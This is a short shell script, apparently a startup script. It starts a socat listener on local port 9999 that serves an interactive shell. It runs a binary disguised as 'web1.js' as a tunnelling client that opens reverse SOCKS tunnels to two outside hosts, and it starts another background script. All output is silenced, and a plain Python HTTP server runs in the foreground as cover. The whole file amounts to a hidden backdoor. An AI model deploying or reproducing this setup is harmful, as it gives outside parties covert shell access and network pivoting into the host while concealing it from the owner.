chmod +x web1.js
chmod +x socat
chmod +x busybox
./socat TCP-LISTEN:9999,fork,reuseaddr,bind=127.0.0.1  EXEC:"sh -li",stderr,pty,setsid,ctty 2>&1 &
./web1.js client --keepalive 55s --max-retry-interval 60s http://oa1.ximiximi.eu.org:2052 R:2443:socks >/dev/null 2>&1 &
./web1.js client --keepalive 55s --max-retry-interval 60s http://oa2.ximiximi.eu.org:2052 R:2443:socks >/dev/null 2>&1 &
./busybox sh pulseloop.sh >/dev/null 2>&1 &

python -m http.server

